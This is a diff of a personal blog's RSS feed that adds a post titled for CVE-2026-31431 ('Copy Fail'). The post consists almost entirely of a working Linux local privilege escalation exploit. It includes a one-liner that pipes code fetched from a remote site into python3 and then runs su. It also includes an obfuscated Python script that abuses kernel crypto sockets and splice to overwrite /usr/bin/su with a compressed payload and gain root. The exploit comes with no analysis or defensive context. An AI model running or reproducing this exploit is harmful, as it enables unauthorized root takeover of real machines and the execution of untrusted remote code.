@@ -1,5 +1,25 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>小饅頭の部落格</title><link>https://grapehut.dpdns.org</link><description>Stay hungry. Stay foolish. --Steve Jobs</description><copyright>小饅頭の部落格</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>../avatar.png</url><title>avatar</title><link>https://grapehut.dpdns.org</link></image><lastBuildDate>Sat, 09 May 2026 09:08:37 +0000</lastBuildDate><managingEditor>小饅頭の部落格</managingEditor><ttl>60</ttl><webMaster>小饅頭の部落格</webMaster><item><title>Vol.46 Claude Code 入門</title><link>https://grapehut.dpdns.org/post/47.html</link><description># 各種CLI
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>小饅頭の部落格</title><link>https://grapehut.dpdns.org</link><description>Stay hungry. Stay foolish. --Steve Jobs</description><copyright>小饅頭の部落格</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>../avatar.png</url><title>avatar</title><link>https://grapehut.dpdns.org</link></image><lastBuildDate>Sat, 09 May 2026 11:15:50 +0000</lastBuildDate><managingEditor>小饅頭の部落格</managingEditor><ttl>60</ttl><webMaster>小饅頭の部落格</webMaster><item><title>Vol.47 Copy Fail CVE-2026-31431</title><link>https://grapehut.dpdns.org/post/48.html</link><description>https://copy.fail/
+
+
+```
+curl https://copy.fail/exp | python3 &amp;&amp; su
+id
+```
+
+exp.py
+```
+#!/usr/bin/env python3
+import os as g,zlib,socket as s
+def d(x):return bytes.fromhex(x)
+def c(f,t,c):
+ a=s.socket(38,5,0);a.bind(('aead','authencesn(hmac(sha256),cbc(aes))'));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b'A'*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
+ try:u.recv(8+t)
+ except:0
+f=g.open('/usr/bin/su',0);i=0;e=zlib.decompress(d('78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3'))
+while i&lt;len(e):c(f,i,e[i:i+4]);i+=4
+g.system('su')
+```。</description><guid isPermaLink="true">https://grapehut.dpdns.org/post/48.html</guid><pubDate>Sat, 09 May 2026 11:15:21 +0000</pubDate></item><item><title>Vol.46 Claude Code 入門</title><link>https://grapehut.dpdns.org/post/47.html</link><description># 各種CLI
 名称|コマンド
 ---|---
 googleworkspace | npm install -g @googleworkspace/cli
